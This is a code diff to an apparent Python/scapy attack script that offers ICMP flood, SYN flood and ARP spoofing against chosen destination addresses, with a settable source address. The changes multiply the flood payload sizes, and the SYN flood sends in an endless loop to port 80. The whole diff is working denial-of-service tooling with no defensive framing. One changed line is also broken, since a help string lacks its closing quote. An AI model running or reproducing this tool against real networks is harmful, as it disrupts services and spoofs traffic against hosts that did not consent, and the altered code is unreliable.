@@ -14,8 +14,8 @@ parser = argparse.ArgumentParser()
 # Adding optional argument
 parser.add_argument("-i", "--ip", help = "Destination IP Address")
 parser.add_argument("-s", "--source", help = "Source IP Address")
-parser.add_argument("--icmp", help = "ICMP Flood - size of the packet in bytes")
-parser.add_argument("--syn", help = "SYN Flood - size of the packet in bytes ")
+parser.add_argument("--icmp", help = "ICMP Flood - message on the packet)
+parser.add_argument("--syn", help = "SYN Flood - message on the packet")
 parser.add_argument("--arp", help = "ARP Spoofing - Host IP Address")
 parser.add_argument("-n", "--number", help = "Number of packets")
 parser.add_argument("-f", "--file", type=argparse.FileType('r'), help = "File with destination IP Addresses")
@@ -50,12 +50,12 @@ def thread_delay(thread_name, delay, ip):
 	
 
 	if args.icmp:
- 		send(numPackets*(fragment(ip_layer/ICMP()/args.icmp)))
+ 		send(numPackets*(fragment(ip_layer/ICMP()/args.icmp*6000)))
 
 
 	elif args.syn:
 		tcp=TCP(sport=RandShort(), dport=80, flags="S")
-		raw=Raw(args.syn)
+		raw=Raw(args.syn*1024)
 		p=ip_layer/tcp/raw
 		send(p, loop=1, verbose=0)
 
